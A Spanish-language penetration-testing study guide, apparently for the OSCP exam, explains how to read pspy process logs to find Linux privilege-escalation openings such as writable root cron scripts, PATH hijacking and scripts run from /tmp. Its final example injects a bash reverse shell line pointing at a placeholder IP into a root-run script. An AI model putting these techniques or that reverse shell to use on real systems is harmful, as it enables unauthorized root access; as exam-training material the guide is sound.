# 📖 Guía para Leer e Interpretar la Salida de `pspy` (OSCP)

## 🎯 Objetivo

Aprender a **interpretar el output de `pspy`** para detectar potenciales vectores de **escalada de privilegios**.

---

## 🔍 Formato del Output

Cada línea del log de `pspy` tiene esta estructura:

```plaintext
YYYY/MM/DD HH:MM:SS CMD: UID=XXXX  PID=XXXX  | /ruta/comando ejecutado
```

### Ejemplo:

```plaintext
2025/04/22 12:00:01 CMD: UID=0    PID=1234   | /bin/sh /usr/local/bin/backup.sh
```

### Significado:

- `UID=0`: el usuario que ejecuta el proceso (UID=0 es root).
- `PID=1234`: ID del proceso.
- El comando que se ejecutó: en este caso, un script como root.

---

## 👁️‍🗨️ ¿Qué buscar?

### 1. **UID sospechosos**
- Si `UID=0`, el proceso lo ejecuta `root` → ¡potencial vector de escalada!
- También vale observar procesos como `UID=1000` si es otro usuario con más permisos que tú.

---

### 2. **Comandos periódicos (cron jobs)**
Busca comandos que se ejecuten cada minuto u otros intervalos regulares. Ejemplo:

```plaintext
CMD: UID=0 PID=2345 | /usr/bin/python3 /scripts/sync.py
```

Acciones:
- Comprobar si `/scripts/sync.py` es **escribible** por ti (`ls -l` o `stat`).
- Si es así, puedes **inyectar código malicioso**.

---

### 3. **Comandos mal configurados**
Si ves algo como:

```plaintext
CMD: UID=0 PID=1357 | backup
```

Puede indicar que el script está usando un comando sin ruta completa. Esto es vulnerable a **PATH hijacking**.

---

### 4. **Uso de binarios externos**
Ejemplo:

```plaintext
CMD: UID=0 PID=4567 | /bin/bash /home/dev/run.sh
```

- Inspecciona `/home/dev/run.sh`.
- Si contiene llamadas a binarios sin ruta (como `cp`, `tar`, `gzip`, etc.), podrías **crear un binario falso** con ese nombre y alterar tu `PATH`.

---

### 5. **Ejecuciones sospechosas en directorios temporales**
```plaintext
CMD: UID=0 PID=9876 | /tmp/runme
```

Acciones:
- Revisar `/tmp/runme`.
- Si es ejecutado por root y tú puedes escribir en él: ¡escalada garantizada!

---

## 🧠 Tips para la lectura eficiente

- 🛑 **Concéntrate en UID=0**: son los procesos que realmente te interesan.
- ⏱️ Deja corriendo `pspy` al menos 5 minutos: muchos cron jobs son cada minuto.
- 🧩 Si ves un script o binario, **búscalo y analiza los permisos**.
- 🔍 Si ves un proceso interesante y no puedes escribir directamente en él, explora si puedes modificar algo **en su cadena de ejecución** (binarios, variables de entorno, archivos dependientes).

---

## 🧪 Ejemplo completo y análisis

```plaintext
2025/04/22 12:00:01 CMD: UID=0    PID=2345   | /bin/bash /opt/scripts/backup.sh
```

Revisamos:

```bash
ls -l /opt/scripts/backup.sh
```

Si tienes permiso de escritura, puedes insertar:

```bash
bash -i >& /dev/tcp/TU_IP/PUERTO 0>&1
```

---

## ✅ Conclusión

`pspy` es una herramienta **clave para detectar automatismos peligrosos**. Leer bien su output te permitirá encontrar vectores de ataque silenciosos y efectivos durante el examen.
